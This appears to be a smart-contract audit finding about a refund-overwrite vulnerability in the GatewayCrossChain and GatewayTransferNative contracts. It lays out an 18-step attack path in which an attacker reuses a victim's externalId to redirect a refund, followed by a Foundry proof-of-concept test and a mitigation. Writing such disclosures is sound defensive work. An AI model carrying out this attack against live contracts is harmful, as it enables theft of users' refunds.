# Refund can be stolen due to refundInfo being overwritten

### Summary

The protocol's cross-chain messaging and refund mechanism is vulnerable to an attack where a malicious actor can overwrite a legitimate user's pending refund information. By crafting a specific payload for a cross-chain transaction, an attacker can cause the `externalId` of a victim's previously failed transaction and the attacker's own wallet address to be recorded in the refund data. This allows the attacker to subsequently claim the refund intended for the victim or a refund derived from the attacker's parameters.

### Root Cause

The vulnerability exists because the contracts `GatewayCrossChain.sol` and `GatewayTransferNative.sol` trust the externalId and receiver information decoded from the incoming cross-chain message when constructing RevertOptions for outbound calls and when storing refund details, without sufficient checks to prevent overwriting existing, valid refund entries.

### Attack Path

1. A legitimate user (Victim) initiates a cross-chain transaction (e.g., via `GatewaySend.depositAndCall`).
2. This transaction is processed by `GatewayCrossChain.onCall` or `GatewayTransferNative.onCall`.
3. The subsequent withdrawal from ZetaChain to the final destination chain (initiated by `GatewayCrossChain` calling `GatewayZEVM.withdrawAndCall` or similar) fails for a legitimate reason.
4. `GatewayZEVM` calls `GatewayCrossChain.onRevert` (or `onAbort`).
5. A RefundInfo struct is created in **GatewayCrossChain: refundInfos[victimExternalId] = RefundInfo({externalId: victimExternalId, token: victimToken, amount: victimAmount, walletAddress: victimWalletBytes})**
6. The attacker monitors the for `CrossChainRefund` events or inspects failed transactions to identify a `victimExternalId` associated with a pending refund.
7. The attacker calls an entry point on a source chain contract (e.g., `GatewaySend.depositAndCall`).
8. The payload (or message part of it) for this call is meticulously crafted: The segment of the payload that will be decoded as `externalId` by `GatewayCrossChain.onCall` (or `GatewayTransferNative.onCall`) is set to `victimExternalId`. The segment of the payload that will be decoded as `receiver` (e.g., decoded.receiver) by `GatewayCrossChain.onCall` is set to `attackerWalletBytes`. Other parameters within the payload (e.g., destination contract for withdrawal, swap data) are intentionally set by the attacker to ensure the subsequent withdrawal operation will fail.
9. The attacker's transaction is processed by the protocol, and `GatewayZEVM` calls `GatewayCrossChain.onCall` (or `GatewayTransferNative.onCall`) with the attacker's crafted message
10. Inside onCall, `externalId` is decoded as `victimExternalId` (from the attacker's message).
11. decoded.receiver is decoded as `attackerWalletBytes` (from the attacker's message).
12. The application contract then attempts the cross-chain withdrawal (e.g., by calling its internal `_handleEvmOrSolanaWithdraw`, which in turn calls `withdrawAndCall`).
13. When calling `GatewayZEVM.withdrawAndCall` (or `withdraw`), the `RevertOptions.revertMessage` is constructed using the attacker-influenced data: **bytes.concat(victimExternalId, attackerWalletBytes)**
14. The withdrawal operation (based on the attacker's parameters designed to cause failure) fails on the destination chain or within `GatewayZEVM`.
15. `GatewayZEVM` calls `GatewayCrossChain.onRevert` (or `onAbort`) using the revertAddress specified in RevertOptions
16. The `revertContext.revertMessage` (or `abortContext.revertMessage`) received by `GatewayCrossChain` is now **bytes.concat(victimExternalId, attackerWalletBytes)**
17. Inside `onRevert` (or `onAbort`), the contract parses this revertMessage, extracting `victimExternalId` and `attackerWalletBytes`. It then executes **refundInfos[victimExternalId] = RefundInfo({externalId: victimExternalId, token: attackerToken, amount: attackerAmount, walletAddress: attackerWalletBytes})**. This action overwrites the victim's original, legitimate refund entry associated with victimExternalId.
18. The attacker calls `claimRefund(victimExternalId)` on `GatewayCrossChain` (or `GatewayTransferNative`), The **require(bots[msg.sender] || msg.sender == receiver, "INVALID_CALLER");** check now uses receiver derived from attackerWalletBytes (stored in the overwritten refundInfo). Since msg.sender is the attacker, this check passes, The attacker successfully receives the refund.

### Impact

Victim's legitimate refund can be stolen, leading denial of service

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {GatewayCrossChain} from "../contracts/GatewayCrossChain.sol";
import {GatewayTransferNative} from "../contracts/GatewayTransferNative.sol";
import {ZRC20Mock} from "../contracts/mocks/ZRC20Mock.sol";
import {GatewayZEVMMock} from "../contracts/mocks/GatewayZEVMMock.sol";
import {DODORouteProxyMock} from "../contracts/mocks/DODORouteProxyMock.sol";
import {console} from "forge-std/console.sol";
import "@zetachain/protocol-contracts/contracts/zevm/interfaces/IGatewayZEVM.sol";

contract ExternalIdManipulationTest is Test {
    
    GatewayCrossChain public gatewayCrossChain;
    GatewayTransferNative public gatewayTransferNative;
    GatewayZEVMMock public gatewayZEVM;
    ZRC20Mock public token1Z;
    ZRC20Mock public token2Z;
    DODORouteProxyMock public dodoRouteProxy;
    
    address public user1;
    address public user2;
    address public bot;
    address public owner;
    
    function setUp() public {
        owner = address(this);
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        bot = makeAddr("bot");
        
        // Deploy mocks
        gatewayZEVM = new GatewayZEVMMock();
        token1Z = new ZRC20Mock("Token1Z", "T1Z", 18);
        token2Z = new ZRC20Mock("Token2Z", "T2Z", 18);
        dodoRouteProxy = new DODORouteProxyMock();
        
        // Deploy GatewayCrossChain
        GatewayCrossChain gatewayImpl = new GatewayCrossChain();
        bytes memory initData = abi.encodeWithSelector(
            GatewayCrossChain.initialize.selector,
            address(gatewayZEVM),
            address(dodoRouteProxy),
            address(dodoRouteProxy), // Using same for DODOApprove
            owner,
            5, // feePercent (0.5%)
            50, // slippage (5%)
            200000 // gasLimit
        );
        ERC1967Proxy gatewayProxy = new ERC1967Proxy(address(gatewayImpl), initData);
        gatewayCrossChain = GatewayCrossChain(payable(address(gatewayProxy)));
        
        // Deploy GatewayTransferNative
        GatewayTransferNative transferImpl = new GatewayTransferNative();
        bytes memory transferInitData = abi.encodeWithSelector(
            GatewayTransferNative.initialize.selector,
            address(gatewayZEVM),
            address(dodoRouteProxy),
            address(dodoRouteProxy), // Using same for DODOApprove
            owner,
            5, // feePercent (0.5%)
            50, // slippage (5%)
            200000 // gasLimit
        );
        ERC1967Proxy transferProxy = new ERC1967Proxy(address(transferImpl), transferInitData);
        gatewayTransferNative = GatewayTransferNative(payable(address(transferProxy)));
        
        // Whitelist bot
        gatewayCrossChain.setBot(bot, true);
        gatewayTransferNative.setBot(bot, true);
    }
    
    function test_ExternalIdRefundOverwrite_GatewayCrossChain() public {
        address victim = user1;
        address attacker = user2;
        ZRC20Mock refundToken = token1Z;
        uint256 victimAmount = 100 ether;
        uint256 attackerAmount = 50 ether;

        // Mint tokens to the contract for refunds
        refundToken.mint(address(gatewayCrossChain), victimAmount + attackerAmount);

        // 1. Victim's transaction fails and creates a refund entry
        bytes32 victimExternalId = keccak256(abi.encodePacked("victim_transaction", block.timestamp));
        bytes memory victimWallet = abi.encodePacked(victim);
        bytes memory victimRevertMessage = bytes.concat(victimExternalId, victimWallet);

        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encodePacked(address(0x1111)),
                chainID: 1,
                asset: address(refundToken),
                amount: victimAmount,
                outgoing: false,
                revertMessage: victimRevertMessage
            })
        );

        // Verify victim's refund is stored
        (bytes32 storedId, address storedToken, uint256 storedAmount, bytes memory storedWallet) = 
            gatewayCrossChain.refundInfos(victimExternalId);
        
        assertEq(storedId, victimExternalId, "Victim's external ID should be stored");
        assertEq(storedToken, address(refundToken), "Victim's token should be stored");
        assertEq(storedAmount, victimAmount, "Victim's amount should be stored");
        assertEq(storedWallet, victimWallet, "Victim's wallet should be stored");

        // 2. Attacker creates a transaction that fails with the SAME externalId
        bytes memory attackerWallet = abi.encodePacked(attacker);
        bytes memory attackerRevertMessage = bytes.concat(victimExternalId, attackerWallet);

        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encodePacked(address(0x2222)),
                chainID: 1,
                asset: address(refundToken),
                amount: attackerAmount,
                outgoing: false,
                revertMessage: attackerRevertMessage
            })
        );

        // 3. Verify that the refund info has been overwritten
        (bytes32 overwrittenId, address overwrittenToken, uint256 overwrittenAmount, bytes memory overwrittenWallet) = 
            gatewayCrossChain.refundInfos(victimExternalId);
        
        assertEq(overwrittenId, victimExternalId, "External ID should still be the same");
        assertEq(overwrittenToken, address(refundToken), "Token should still be the same");
        assertEq(overwrittenAmount, attackerAmount, "Amount should now be attacker's amount");
        assertEq(overwrittenWallet, attackerWallet, "Wallet should now be attacker's wallet");

        // 4. Attacker can now claim the refund
        uint256 attackerBalanceBefore = refundToken.balanceOf(attacker);
        
        vm.prank(attacker);
        gatewayCrossChain.claimRefund(victimExternalId);
        
        uint256 attackerBalanceAfter = refundToken.balanceOf(attacker);
        
        assertEq(attackerBalanceAfter, attackerBalanceBefore + attackerAmount, "Attacker should receive the refund");

        // 5. Victim tries to claim but fails because refund was already claimed
        vm.expectRevert("REFUND_NOT_EXIST");
        vm.prank(victim);
        gatewayCrossChain.claimRefund(victimExternalId);
    }
```

### Mitigation

In the `onRevert` and `onAbort` functions `GatewayCrossChain` and `GatewayTransferNative`, before storing or updating the `refundInfos[externalId]`, add a check to ensure that no valid refund entry for that externalId already exists.
